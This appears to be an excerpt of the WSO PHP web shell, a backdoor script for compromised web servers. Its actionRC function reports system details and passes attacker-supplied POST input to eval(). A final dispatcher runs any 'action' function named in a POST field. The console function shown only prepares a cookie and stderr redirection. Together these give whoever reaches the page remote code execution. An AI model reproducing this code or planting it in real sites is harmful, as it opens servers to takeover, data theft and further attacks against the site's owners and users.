<?php
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"wso_version" => WSO_VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
		echo "end";
	}
}

function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
}

if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>
